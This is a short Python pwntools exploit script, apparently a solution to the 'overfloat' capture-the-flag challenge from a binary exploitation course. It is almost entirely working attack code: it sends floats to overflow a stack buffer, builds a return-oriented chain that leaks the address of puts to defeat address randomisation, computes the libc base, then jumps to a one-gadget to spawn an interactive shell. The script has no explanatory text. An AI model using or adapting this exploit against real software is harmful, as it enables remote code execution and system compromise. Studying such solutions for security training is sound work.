# from nightmare
import struct


pack_float = lambda x: struct.pack('f', x)
unpack_float = lambda x: struct.unpack('f', x)[0]


def send_val(x):
    v1 = x & ((2**32) - 1)
    v2 = x >> 32
    target.sendline(str(unpack_float(p32(v1))))
    target.sendline(str(unpack_float(p32(v2))))


from pwn import *


target = process('./overfloat')
libc = ELF('libc-2.31.so')
# gdb.attach(target, gdbscript='b *0x00400a14 \n b done*0x004009b1')


# give away puts' address
puts_got = 0x00602020
puts_plt = 0x00400690
pop_rdi = 0x00400a83
start_main = 0x00400993

for i in range(7):
    send_val(0xdeadbeefdeadbeef)

send_val(pop_rdi)
send_val(puts_got)
send_val(puts_plt)
send_val(start_main)

target.sendline('done')

target.recvuntil('BON VOYAGE!\n')

leak = target.recvline().rstrip()
puts_leak = u64(leak + b'\x00' * (8 - len(leak)))
print(f'leak: {puts_leak}')

base = puts_leak - libc.symbols['puts']
print(f'base: {base}')

# Do it again but put exploit gadget's address now
exploit_gadget_raw = 0xe6c81
exploit_gadget_rebased = exploit_gadget_raw + base

for i in range(7):
    send_val(0xdeadbeefdeadbeef)

send_val(exploit_gadget_rebased)

target.sendline('done')

target.interactive()